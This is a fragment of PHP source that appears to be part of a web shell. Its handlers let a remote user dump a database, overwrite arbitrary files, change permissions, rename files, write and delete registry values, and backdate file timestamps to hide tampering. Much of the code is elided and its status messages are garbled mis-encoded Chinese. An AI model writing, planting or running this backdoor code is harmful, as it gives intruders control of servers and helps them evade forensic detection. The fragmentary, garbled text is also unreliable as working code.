...
if ($_POST['backuptype'] == 'download') {
	@mysql_connect($servername,$dbusername,$dbpassword) or die("E?�??�?��?E��U");
	@mysql_select_db($dbname) or die("??O?E?�??�E��U");	
...
elseif ($_POST['do'] == 'doeditfile') {
	if (!empty($_POST['editfilename'])) {
		...
		@$fp=fopen("$filename","w");
		echo $msg=@fwrite($fp,$_POST['filecontent']) ? "?�E�I?�?�E��!" : "?�E�E��U!";
		@fclose($fp);
	} else {
		echo "C�E?E�I�??�༭�?I?�??�!";
	}
...
elseif ($_POST['do'] == 'editfileperm') {
	if (!empty($_POST['fileperm'])) {
		...
		echo (@chmod($dir."/".$file,$fileperm)) ? "E�?O??�?�E��!" : "??�?E��U!";
...
elseif ($_POST['do'] == 'rename') {
	if (!empty($_POST['newname'])) {
		...
		if (@file_exists($newname)) {
			...
			echo (@rename($_POST['oldname'],$newname)) ? basename($_POST['oldname'])." �E���??�I? ".$_POST['newname']." !" : "I?�??�??�?E��U!";
		}
	} else {
		echo "C�E?E�I�??�?�?I?�??�!";
	}
...
elseif ($_POST['do'] == 'domodtime') {
	if (!@file_exists($_POST['curfile'])) {
		...
		if (!@file_exists($_POST['tarfile'])) {
			...
			echo (@touch($_POST['curfile'],$time,$time)) ? basename($_POST['curfile'])." �???�?E��?�E���?I? ".date("Y-m-d H:i:s",$time)." !" : "I?�?�???�?E��???�?E��U!";
		}
	}
}
...
elseif(($regwrite) AND !empty($_POST['writeregname']) AND !empty($_POST['regtype']) AND !empty($_POST['regval'])) {
	...
	echo ($a=='0') ? "?�E�ע�?�?�??��E��!" : "?�E� ".$_POST['regname'].", ".$_POST['regval'].", ".$_POST['regtype']." E��U!";
}
...
elseif(($regdelete) AND !empty($_POST['delregname'])) {
	...
	echo ($a=='0') ? "E��?ע�?�?�??��E��!" : "E��? ".$_POST['delregname']." E��U!";
}
...
elseif ($_GET['action'] == "newtime") {
	...
	$tb->tdbody("From?: ".$tb->makeinput('curfile',$file,'readonly')." To: ".$tb->makeinput('tarfile','?�?�?�?�A�����I?�??�'),'center','2','30');
